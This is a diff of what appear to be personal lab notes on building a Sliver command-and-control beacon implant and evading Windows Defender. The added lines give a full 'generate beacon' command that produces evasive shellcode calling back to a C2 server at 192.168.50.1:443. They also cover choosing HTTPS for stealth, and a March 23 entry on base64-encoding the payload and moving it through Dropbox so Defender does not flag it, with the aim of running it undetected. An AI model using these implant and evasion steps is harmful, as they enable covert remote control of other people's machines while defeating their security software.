@@ -17,6 +17,7 @@
 - Beacon implant: checks in periodically for new commands, less noisy.
 - Why build a custom payload? The simple answer is if its well known in the offensive space, then its most likely well known in the defensive space as well, including to EDR and AV vendors. Payloads created with default setups will usually be able to be picked up by security solutions almost instantly. An example of this is to create a default msfvenom payload yourself then try to place it on your Windows desktop (or a windows VM if you're using another OS) with Defender ON. https://redheadsec.tech/building-a-simple-custom-implant-for-sliver-shellcode/
 - But normally staged payloads are preferable as it allows for a smaller footprint for AV to hit on when they are loaded on to the system.
+- mtls better for encryption, https better for stealth
   
 ---
 
@@ -123,8 +124,29 @@ Creating a custom (beacon) implant profile: `profiles new beacon stealthy-beacon
 
 ^^^ scratch all this. I had issues trying to make a custom c2profile and then creating an implant profile using the custom c2profile. It didn't work out.
 
-Generates shellcode payload for the stager `generate beacon --name stealth-stager --format shellcode --arch amd64 --http https://192.168.50.1:443 --c2profile default --evasion --skip-symbols --poll-timeout 60 --reconnect 60`
+Generates beacon implant (previously I had thought this generates a stager, it DOESNT) `generate beacon --name stealth-stager --format shellcode --arch amd64 --http https://192.168.50.1:443 --c2profile default --evasion --skip-symbols --poll-timeout 60 --reconnect 60` 
+
+Key aspects of the generated beacon based on the command:
+
+    It uses HTTP(S) for communication with the C2 server at 192.168.50.1:443
+
+    It applies the "default" C2 profile for traffic shaping
+
+    Evasion techniques are enabled
+
+    Symbol obfuscation is skipped for faster compilation
+
+    The poll timeout is set to 60 seconds
+
+    It will attempt to reconnect every 60 seconds if the connection is lost
+
 
 We use a loader as it is a way to execute the stager more stealthily. Supposedly once we get the stager shellcode onto the system and running, the stager will communicate with the c2 server and have it auto build and send the full implant over.
 
+---
+
+### March 23
+Using above stealth-stager, Base64-encode the stager: `base64 stealth-stager.bin > shellcode.txt`. Use DropBox to transfer onto Windows Machine. Tried using .7z to encrypt the file for better stealth when getting it onto the Windows System (try to avoid scanning), but Windows by default does not come with any tools that can extract .7z files. So I tried transferring the base64-encoded stager `shellcode.txt` to the Windows machine using DropBox and Defender didn't flag it (this is because base64 encode makes it appear as a regular txt file).
+
+so FUCK ME THIS WAS JUST A BEACON IMPLANT ALL ALONG. We're gonna see if we can get it to run without Defender detecting. 
 
